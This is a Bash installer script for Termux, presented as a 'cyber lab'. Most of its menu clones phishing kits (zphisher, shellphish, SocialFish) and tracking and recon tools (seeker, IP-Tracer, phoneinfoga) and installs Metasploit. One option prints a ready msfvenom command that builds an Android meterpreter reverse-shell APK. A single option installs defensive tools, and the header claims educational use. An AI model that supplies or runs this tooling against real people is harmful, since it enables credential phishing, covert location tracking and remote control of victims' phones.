#!/data/data/com.termux/files/usr/bin/bash

# Cyber Lab Installer for Termux
# Ethical + Educational Use Only ⚠️

# Colors
colors=(31 32 33 34 35 36)
rand=$((RANDOM % 6))
c="\033[1;${colors[$rand]}m"
reset="\033[0m"

echo -e "${c}
====================================
   ⚡ Cyber Security Lab Installer ⚡
   Kali + Parrot OS Tools Collection
   Use for EDUCATION Only 🚀
====================================
${reset}"

# Update system
pkg update -y && pkg upgrade -y
pkg install -y git curl wget proot-distro python python-pip

# Menu
echo -e "${c}[1] Kali NetHunter (GUI+CLI)${reset}"
echo -e "${c}[2] Parrot OS (GUI+CLI)${reset}"
echo -e "${c}[3] Phishing Simulation Tools${reset}"
echo -e "${c}[4] Tracking & Recon Tools${reset}"
echo -e "${c}[5] Payload Generator (msfvenom)${reset}"
echo -e "${c}[6] Defence Tools (Wireshark, Yara, etc.)${reset}"
echo -e "${c}[7] Exit${reset}"

read -p "Select an option: " opt

case $opt in
  1) echo -e "${c}Installing Kali NetHunter...${reset}"
     git clone https://github.com/AndronixApp/AndronixOrigin kali
     cd kali && bash *.sh
     ;;
  2) echo -e "${c}Installing Parrot OS...${reset}"
     git clone https://github.com/AndronixApp/AndronixOrigin parrot
     cd parrot && bash *.sh
     ;;
  3) echo -e "${c}Installing Phishing Tools...${reset}"
     pkg install -y php openssh
     git clone https://github.com/htr-tech/zphisher
     git clone https://github.com/thelinuxchoice/shellphish
     git clone https://github.com/UndeadSec/SocialFish
     ;;
  4) echo -e "${c}Installing Tracking & Recon Tools...${reset}"
     git clone https://github.com/thewhiteh4t/seeker
     git clone https://github.com/Rajkumrdusad/IP-Tracer
     git clone https://github.com/sundowndev/phoneinfoga
     ;;
  5) echo -e "${c}Setting up Payload Generator...${reset}"
     pkg install -y metasploit
     echo "Run: msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > payload.apk"
     ;;
  6) echo -e "${c}Installing Defence Tools...${reset}"
     pkg install -y nmap wireshark-android yara lynis
     ;;
  7) echo -e "${c}Exiting...${reset}"
     exit ;;
  *) echo -e "${c}Invalid Option!${reset}" ;;
esac
